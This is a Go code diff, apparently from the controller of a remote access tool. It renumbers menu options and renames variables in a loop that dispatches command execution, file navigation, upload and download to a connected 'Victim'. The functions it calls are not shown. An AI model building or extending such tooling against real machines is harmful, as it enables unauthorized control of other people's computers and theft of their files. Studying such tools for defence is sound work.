@@ -16,11 +16,11 @@ import (
 
 func options() {
 	fmt.Println()
-	fmt.Println("\t[ 01 ]  Execute Command")
-	fmt.Println("\t[ 02 ]  Move in File system")
-	fmt.Println("\t[ 03 ]  UploadFile")
-	fmt.Println("\t[ 04 ]  Download")
-	fmt.Println("\t[ 00 ]  Exit")
+	fmt.Println("\t[ 1 ]  Execute Command")
+	fmt.Println("\t[ 2 ]  Move in File system")
+	fmt.Println("\t[ 3 ]  UploadFile")
+	fmt.Println("\t[ 4 ]  Download")
+	fmt.Println("\t[ 0 ]  Exit")
 	fmt.Println()
 
 }
@@ -48,38 +48,38 @@ func main() {
 	for looper {
 		options()
 		fmt.Printf("[+] Enter Options ")
-		user_input_raw, err := reader.ReadString('\n')
+		userInputRaw, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
 
-		connection.Write([]byte(user_input_raw))
+		connection.Write([]byte(userInputRaw))
 
-		user_input := strings.TrimSuffix(user_input_raw, "\n")
+		userInput := strings.TrimSuffix(userInputRaw, "\n")
 
 		switch {
-		case user_input == "1":
+		case userInput == "1":
 			fmt.Println("[+] Command Execution program")
 			err := commands.ExecuteCommandWindows(connection)
 			DisplayError(err)
 
-		case user_input == "2":
+		case userInput == "2":
 			fmt.Println("[+] Navigating File system on Victim")
 			err = filenavigation.NavigateSystem(connection)
 			DisplayError(err)
 
-		case user_input == "3":
+		case userInput == "3":
 			fmt.Println("[+] Uploading File to the Victim")
 			err = upload.UploadFileToVictim(connection)
 			DisplayError(err)
 
-		case user_input == "4":
+		case userInput == "4":
 			fmt.Println("[+] Downloading File from the victim ")
 			err = download.DownloadFromVictimServer(connection)
 			DisplayError(err)
 
-		case user_input == "0":
+		case userInput == "0":
 			fmt.Println("[+] Exiting the program")
 			looper = false
 		default:
